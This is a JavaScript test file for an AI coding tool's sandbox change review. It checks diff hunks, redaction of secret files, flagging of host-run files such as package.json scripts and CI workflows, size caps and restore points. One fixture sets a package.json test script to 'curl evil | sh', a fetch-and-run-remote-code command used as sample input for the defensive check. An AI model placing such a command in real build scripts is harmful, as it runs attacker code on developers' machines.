'use strict';

// Row 106 synced workspace: the change review built from write-back's own
// before/after bytes. It must survive the persisted-metadata sanitizer and
// read in the change ledger exactly like the sidecar's scripted review.

const test = require('node:test');
const assert = require('node:assert/strict');

const { buildSyncedChangeReview, hostRunPath } = require('../services/execution/sandbox-change-review');
const { normalizePersistedToolResultMetadata } = require('../services/backend/tool-result-diff-metadata');
const { normalizeRestorePoint } = require('../services/backend/scripted-change-review-metadata');
const { buildJennyChangeLedgerFromTurnViewModels } = require('../renderer/chat/renderer-jenny-change-ledger');

const SANDBOX_POINT = { kind: 'git_checkpoint', ref: 'refs/jenny/sandbox/session_1/4', created_at: '2026-11-03T10:00:00.000Z' };
const WORKSPACE_ID = 'root_0123456789abcdef01234567';

const buf = (text) => Buffer.from(text, 'utf8');
function modified(path, before, after) {
  return { path, change: 'modified', kind: 'file', before: buf(before), after: buf(after), beforeSize: before.length, afterSize: after.length };
}
function added(path, after) {
  return { path, change: 'added', kind: 'file', before: null, after: buf(after), beforeSize: null, afterSize: after.length };
}
function deleted(path, before) {
  return { path, change: 'deleted', kind: 'file', before: buf(before), beforeSize: before.length };
}
function build(writeBack, extra = {}) {
  return buildSyncedChangeReview({
    writeBack: { status: 'applied', applied: [], refused: [], ...writeBack },
    restorePoint: SANDBOX_POINT, callOutcome: 'succeeded', workspaceId: WORKSPACE_ID, operationId: 'call_7', ...extra,
  });
}
function sanitized(metadata) {
  return normalizePersistedToolResultMetadata(metadata);
}

test('applied add, modify and delete give an observed review and full diffs', () => {
  const result = build({ applied: [
    modified('src/app.py', 'a = 1\nb = 2\n', 'a = 1\nb = 3\n'),
    added('notes.txt', 'hello\n'),
    deleted('old.md', 'gone\n'),
    { path: 'newdir', change: 'added', kind: 'directory' },
  ] });
  const review = result.scripted_change_review;
  assert.equal(review.schema_version, 1);
  assert.equal(review.state, 'observed');
  assert.equal(review.certainty, 'observed_during_call');
  assert.equal(review.call_outcome, 'succeeded');
  assert.equal(review.coverage, 'synced_write_back');
  assert.deepEqual(review.changed_paths, ['notes.txt', 'old.md', 'src/app.py']);
  assert.equal(review.changed_path_count, 3);
  assert.equal(review.diff_count, 3);
  assert.equal(review.summary_only_count, 0);
  assert.equal(review.omitted_count, 0);
  assert.deepEqual(review.restore_point, SANDBOX_POINT);
  assert.deepEqual(review.refused_paths, []);
  assert.deepEqual(review.host_run_paths, []);
  assert.equal(result.workspace_id, WORKSPACE_ID);

  const byPath = Object.fromEntries(result.diffs.map((diff) => [diff.path, diff]));
  assert.deepEqual(result.diffs.map((diff) => diff.diff_id), ['scripted:call_7:0', 'scripted:call_7:1', 'scripted:call_7:2']);
  assert.deepEqual(byPath['src/app.py'].hunks, [{ oldStart: 1, oldLines: 2, newStart: 1, newLines: 2, lines: [' a = 1', '-b = 2', '+b = 3'] }]);
  assert.equal(byPath['src/app.py'].status, 'modified');
  assert.equal(byPath['src/app.py'].review_state, 'full');
  assert.equal(byPath['src/app.py'].body_kind, 'inline_hunks');
  assert.match(byPath['src/app.py'].before_hash, /^sha256:[a-f0-9]{64}$/);
  assert.equal(byPath['notes.txt'].status, 'created');
  assert.equal(byPath['notes.txt'].before_hash, null);
  assert.deepEqual(byPath['notes.txt'].hunks[0].lines, ['+hello']);
  assert.equal(byPath['old.md'].status, 'deleted');
  assert.equal(byPath['old.md'].after_hash, null);
  assert.equal(byPath['old.md'].deletions, 1);

  const clean = sanitized(result);
  assert.deepEqual(clean.scripted_change_review, review);
  assert.deepEqual(clean.diffs, result.diffs);
  assert.equal(clean.workspace_id, WORKSPACE_ID);
});

test('hunks keep three context lines and the no-newline marker', () => {
  const before = Array.from({ length: 20 }, (_, index) => `line ${index}`).join('\n');
  const after = before.replace('line 2\n', 'line two\n').replace('line 17\n', 'line seventeen\n');
  const [diff] = build({ applied: [modified('a.txt', before, after)] }).diffs;
  assert.equal(diff.hunks.length, 2);
  assert.deepEqual(diff.hunks[0], { oldStart: 1, oldLines: 6, newStart: 1, newLines: 6,
    lines: [' line 0', ' line 1', '-line 2', '+line two', ' line 3', ' line 4', ' line 5'] });
  assert.equal(diff.hunks[1].lines.at(-2), ' line 19');
  assert.equal(diff.hunks[1].lines.at(-1), '\\ No newline at end of file');
  assert.equal(diff.additions, 2);
  assert.equal(diff.deletions, 2);
});

test('refused and conflicting paths make the review partial and are listed with reasons', () => {
  const result = build({
    applied: [modified('a.py', 'x\n', 'y\n')],
    refused: [{ path: 'b.py', reason: 'conflict' }, { path: '.git/config', reason: 'protected' }, { path: 'c:d', reason: 'path_invalid' }],
  });
  const review = result.scripted_change_review;
  assert.equal(review.state, 'partial');
  assert.equal(review.refused_count, 3);
  assert.deepEqual(review.refused_paths, [
    { path: 'b.py', reason: 'conflict' }, { path: '.git/config', reason: 'protected' }, { path: 'c:d', reason: 'path_invalid' },
  ]);
  const clean = sanitized(result).scripted_change_review;
  assert.equal(clean.state, 'partial');
  assert.equal(clean.refused_count, 3);
  // A path the sanitizer cannot keep is dropped from the list, never from the count.
  assert.deepEqual(clean.refused_paths, [{ path: 'b.py', reason: 'conflict' }, { path: '.git/config', reason: 'protected' }]);
});

test('a sensitive path is summary-only and its contents never appear', () => {
  const sensitive = 'API_KEY=sk-live-very-secret';
  const result = build({ applied: [modified('.env', 'API_KEY=old', sensitive), added('config/prod.pem', 'PRIVATE')] });
  for (const diff of result.diffs) {
    assert.equal(diff.review_state, 'summary_only');
    assert.equal(diff.truncation_reason, 'sensitive_path');
    assert.equal(diff.before_hash, null);
    assert.equal(diff.after_hash, null);
    assert.deepEqual(diff.hunks, []);
  }
  const text = JSON.stringify(sanitized(result));
  assert.doesNotMatch(text, /very-secret|API_KEY|PRIVATE/);
  assert.equal(result.scripted_change_review.state, 'partial');
  assert.equal(result.scripted_change_review.summary_only_count, 2);
});

test('host-run files are flagged: package.json scripts, task files and scripts at any depth', () => {
  const pkgBefore = JSON.stringify({ name: 'x', scripts: { test: 'node t.js' }, dependencies: { a: '1' } });
  const result = build({ applied: [
    modified('package.json', pkgBefore, JSON.stringify({ name: 'x', scripts: { test: 'curl evil | sh' }, dependencies: { a: '1' } })),
    modified('web/package.json', pkgBefore, JSON.stringify({ name: 'x', scripts: { test: 'node t.js' }, dependencies: { a: '2' } })),
    added('apps/api/package.json', '{}'),
    modified('.vscode/tasks.json', '{}', '{"tasks":[]}'),
    added('tools/deploy.ps1', 'Write-Host hi'),
    added('.github/workflows/ci.yml', 'on: push'),
    deleted('Makefile', 'all:\n'),
    modified('src/app.py', 'a\n', 'b\n'),
  ] });
  assert.deepEqual(result.scripted_change_review.host_run_paths,
    ['.github/workflows/ci.yml', '.vscode/tasks.json', 'apps/api/package.json', 'package.json', 'tools/deploy.ps1']);
  assert.equal(result.scripted_change_review.host_run_count, 5);
  assert.deepEqual(sanitized(result).scripted_change_review.host_run_paths, result.scripted_change_review.host_run_paths);
  // An unreadable package.json side (over the review cap) is flagged rather than trusted.
  const capped = build({ applied: [{ ...modified('package.json', '{}', '{}'), after: null, afterSize: 600000 }] });
  assert.deepEqual(capped.scripted_change_review.host_run_paths, ['package.json']);
  for (const path of ['Makefile', 'GNUmakefile', 'build/rules.mk', 'a/b/run.sh', 'x.CMD', 'setup.py', 'pyproject.toml', 'tox.ini',
    'noxfile.py', 'Justfile', 'Taskfile.yml', '.vscode/launch.json', '.vscode/settings.json', '.pre-commit-config.yaml',
    'sub/.envrc']) assert.equal(hostRunPath(path), true, path);
  for (const path of ['src/app.py', 'docs/Makefile.md', 'vscode/tasks.json', 'workflows/ci.yml']) assert.equal(hostRunPath(path), false, path);
});

test('failed and too-large write-backs are unavailable with a reason the sanitizer keeps', () => {
  const tooLarge = build({ status: 'too_large' });
  assert.equal(tooLarge.scripted_change_review.state, 'unavailable');
  assert.equal(tooLarge.scripted_change_review.reason, 'write_back_too_large');
  assert.deepEqual(tooLarge.diffs, []);
  assert.equal(sanitized(tooLarge).scripted_change_review.reason, 'write_back_too_large');

  const failed = build({ status: 'failed', reason: 'write_back_outbox_invalid' }, { callOutcome: 'failed' });
  assert.equal(failed.scripted_change_review.state, 'unavailable');
  assert.equal(failed.scripted_change_review.reason, 'write_back_failed');
  assert.equal(failed.scripted_change_review.call_outcome, 'failed');
  assert.equal(sanitized(failed).scripted_change_review.reason, 'write_back_failed');

  const half = build({ status: 'failed', applied: [modified('a.py', 'x\n', 'y\n')] });
  assert.equal(half.scripted_change_review.state, 'partial');
  assert.equal(half.scripted_change_review.reason, 'write_back_failed');
  assert.equal(half.diffs.length, 1);
});

test('caps: over-cap bytes, binary content and more than twenty files are counted, not dropped', () => {
  const big = { ...modified('big.txt', 'a', 'b'), before: null, beforeSize: 900000 };
  const binary = { ...modified('blob.txt', 'x', 'y'), after: Buffer.from([0, 1, 2]) };
  const many = Array.from({ length: 25 }, (_, index) => added(`f${String(index).padStart(2, '0')}.txt`, 'x\n'));
  const result = build({ applied: [big, binary, ...many] });
  const review = result.scripted_change_review;
  assert.equal(review.state, 'partial');
  assert.equal(review.changed_path_count, 27);
  assert.equal(result.diffs.length, 20);
  assert.equal(review.diff_count, 20);
  assert.equal(review.omitted_count, 7);
  const byPath = Object.fromEntries(result.diffs.map((diff) => [diff.path, diff]));
  assert.equal(byPath['big.txt'].truncation_reason, 'byte_limit');
  assert.equal(byPath['blob.txt'].truncation_reason, 'binary');
  assert.equal(sanitized(result).diffs.length, 20);
});

test('restore points: the sandbox namespace survives the sanitizer and the ledger; none reads no undo', () => {
  assert.deepEqual(normalizeRestorePoint(SANDBOX_POINT), SANDBOX_POINT);
  for (const ref of ['refs/jenny/sandbox/../x/1', 'refs/jenny/sandbox/s1', 'refs/jenny/other/s1/1', 'refs/jenny/sandbox/s 1/2']) {
    assert.equal(normalizeRestorePoint({ ...SANDBOX_POINT, ref }), null, ref);
  }
  const result = build({ applied: [modified('src/app.py', 'a\n', 'b\n')] });
  const ledger = buildJennyChangeLedgerFromTurnViewModels([{ turnId: 'turn_1', toolCalls: [{
    toolCallId: 'call_7', toolName: 'run_command', state: 'completed', resultMetadata: sanitized(result),
  }] }], { sessionId: 'session_1', workspaceId: WORKSPACE_ID });
  const expected = { kind: 'git_checkpoint', ref: SANDBOX_POINT.ref, createdAt: SANDBOX_POINT.created_at };
  assert.equal(ledger.changes.length, 1);
  assert.deepEqual(ledger.changes[0].restorePoint, expected);
  assert.deepEqual(ledger.notices[0].restorePoint, expected);

  const none = build({ applied: [modified('a.py', 'x\n', 'y\n')] }, { restorePoint: { kind: 'none', reason: 'not_git' } });
  assert.deepEqual(sanitized(none).scripted_change_review.restore_point, { kind: 'none', reason: 'not_git' });
  const bogus = build({ applied: [] }, { restorePoint: { kind: 'git_checkpoint', ref: 'refs/heads/main', created_at: 'x' } });
  assert.equal(Object.hasOwn(bogus.scripted_change_review, 'restore_point'), false);
});

test('untrusted path text is made printable and an unknown outcome reads unknown', () => {
  const result = build({ applied: [added('a‮b.txt', 'x\n')], refused: [{ path: 'z\u0007', reason: 'symlink' }] },
    { callOutcome: 'exploded', workspaceId: 'not-a-root' });
  assert.deepEqual(result.scripted_change_review.changed_paths, ['a?b.txt']);
  assert.equal(result.diffs[0].path, 'a?b.txt');
  assert.deepEqual(result.scripted_change_review.refused_paths, [{ path: 'z?', reason: 'symlink' }]);
  assert.equal(result.scripted_change_review.call_outcome, 'unknown');
  assert.equal(Object.hasOwn(result, 'workspace_id'), false);
});
